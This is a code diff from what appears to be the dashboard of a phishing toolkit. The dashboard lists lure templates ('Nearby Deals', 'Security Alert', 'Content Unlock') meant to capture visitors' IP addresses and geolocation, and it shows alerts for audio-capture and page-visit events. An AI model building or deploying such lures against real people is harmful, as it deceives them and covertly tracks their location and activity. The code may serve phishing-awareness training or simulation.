@@ -18,7 +18,7 @@ const phishingCategories = [
     description: 'Templates designed to capture IP address and attempt geolocation.',
     Icon: MapPin,
     links: [
-      { id: 'loc1', name: 'Template: Prize Claim', url: '/phishing/location/prize-claim' },
+      { id: 'loc1', name: 'Template: Nearby Deals', url: '/phishing/location/nearby-deals' },
       { id: 'loc2', name: 'Template: Security Alert', url: '/phishing/location/security-alert' },
       { id: 'loc3', name: 'Template: Content Unlock', url: '/phishing/location/content-unlock' },
     ],
@@ -88,6 +88,9 @@ export default function DashboardPage() {
       } else if (newLog.type === 'audio') {
         toastTitle = "Audio Capture Simulated!";
         toastDescription = `Audio event from IP: ${newLog.ip}.`;
+      } else if (newLog.type === 'generic') {
+        toastTitle = "Page Visit Detected!";
+        toastDescription = `Page: ${newLog.data.message?.split(': ')[1] || 'Unknown page'}, IP: ${newLog.ip}`;
       }
       
       toast({
